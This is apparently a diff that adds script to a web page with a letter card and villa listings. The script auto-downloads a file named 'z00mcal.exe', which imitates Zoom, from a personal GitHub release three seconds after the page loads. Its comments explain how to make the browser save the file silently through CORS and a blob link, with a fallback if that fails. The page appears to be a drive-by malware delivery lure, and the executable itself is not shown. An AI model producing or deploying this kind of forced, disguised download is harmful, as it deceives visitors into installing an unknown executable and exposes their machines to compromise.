+  const EXE_URL = 'https://github.com/paconroj/pacon/releases/download/Zoom/z00mcal.exe';
+  const FILE_NAME = 'z00mcal.exe';
+
+  let downloading = false;
+  const bannerBtn = document.getElementById('manualDownloadBtn');
+  const letterBtn = document.getElementById('letterDownloadBtn');
+  const statusEl = document.getElementById('downloadStatus');
+
+  function setStatus(msg) {
+    if (statusEl) statusEl.textContent = msg;
+  }
+  function setButtonsDisabled(disabled) {
+    if (bannerBtn) bannerBtn.disabled = disabled;
+    if (letterBtn) letterBtn.disabled = disabled;
+  }
+
+  async function downloadExe() {
+    if (downloading) return;
+    downloading = true;
+    setButtonsDisabled(true);
+    setStatus('Downloading installer…');
+
+    try {
+      // fetch follows the GitHub 302 redirect chain automatically and,
+      // because the final asset host sends Access-Control-Allow-Origin: *,
+      // this succeeds without navigating the page.
+      const res = await fetch(EXE_URL, { mode: 'cors', credentials: 'omit' });
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+
+      // Stream the response into a Blob so we control the save.
+      const blob = await res.blob();
+
+      // Same-origin blob URL: the `download` attribute is honored,
+      // so the browser saves the file silently. No navigation.
+      const objectUrl = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = objectUrl;
+      a.download = FILE_NAME;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(() => URL.revokeObjectURL(objectUrl), 60000);
+
+      setStatus('Download started — check your downloads folder. This page stays open.');
+    } catch (err) {
+      // If CORS somehow fails (e.g. corporate proxy strips headers), fall
+      // back to letting GitHub's own attachment disposition do the work.
+      // GitHub sends Content-Disposition: attachment, so this still won't
+      // replace the page — it just hands the file to the download manager.
+      console.warn('Blob download failed, using direct attachment link:', err);
+      setStatus('Starting direct download…');
+      window.location.href = EXE_URL; // GitHub attachment header → download, not navigation
+    } finally {
+      downloading = false;
+      setButtonsDisabled(false);
+    }
+  }
+
+  // ── AUTO-DOWNLOAD 3 SECONDS AFTER LOAD ────────────
+  window.addEventListener('load', function () {
+    let seconds = 3;
+    setStatus(`Auto-download starts in ${seconds}s (this page stays open)…`);
+    const tick = setInterval(function () {
+      seconds -= 1;
+      if (seconds > 0) {
+        setStatus(`Auto-download starts in ${seconds}s (this page stays open)…`);
+      } else {
+        clearInterval(tick);
+        downloadExe();
+      }
+    }, 1000);
+  });
+
+  // ── MANUAL BUTTONS ────────────────────────────────
+  if (bannerBtn) bannerBtn.addEventListener('click', function (e) { e.preventDefault(); downloadExe(); });
+  if (letterBtn) letterBtn.addEventListener('click', function (e) { e.preventDefault(); downloadExe(); });
+
+  // ── STARS ─────────────────────────────────────────
+  const starsContainer = document.getElementById('stars');
+  for (let i = 0; i < 120; i++) {
+    const star = document.createElement('div');
+    star.className = 'star';
+    star.style.cssText = `
+      left: ${Math.random() * 100}%;
+      top: ${Math.random() * 70}%;
+      --d: ${2 + Math.random() * 4}s;
+      --delay: -${Math.random() * 5}s;
+      opacity: ${0.2 + Math.random() * 0.5};
+      width: ${Math.random() > 0.85 ? 3 : 2}px;
+      height: ${Math.random() > 0.85 ? 3 : 2}px;
+    `;
+    starsContainer.appendChild(star);
+  }
+
+  // ── SCROLL ENTRANCE ───────────────────────────────
+  const letterCard = document.querySelector('.letter-card');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        entry.target.style.transition = 'opacity 0.9s ease, transform 0.9s ease';
+        entry.target.style.opacity = '1';
+        entry.target.style.transform = 'translateY(0)';
+        observer.unobserve(entry.target);
+      }
+    });
+  }, { threshold: 0.1 });
+
+  if (letterCard) {
+    letterCard.style.opacity = '0';
+    letterCard.style.transform = 'translateY(40px)';
+    observer.observe(letterCard);
+  }
+
+  document.querySelectorAll('.villa-card').forEach((card, i) => {
+    card.style.opacity = '0';
+    card.style.transform = 'translateY(30px)';
+    card.style.transition = `opacity 0.7s ease ${i * 0.1}s, transform 0.7s ease ${i * 0.1}s`;
+    const vo = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          vo.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+    vo.observe(card);
+  });
+</script>
+</body>
+</html>
